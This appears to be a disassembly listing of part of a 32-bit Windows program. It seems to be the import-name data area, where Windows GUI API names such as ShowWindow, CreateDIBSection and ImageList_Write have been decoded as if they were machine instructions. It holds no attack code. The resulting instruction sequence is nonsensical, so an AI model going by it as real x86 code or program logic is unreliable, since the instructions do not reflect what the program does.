  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
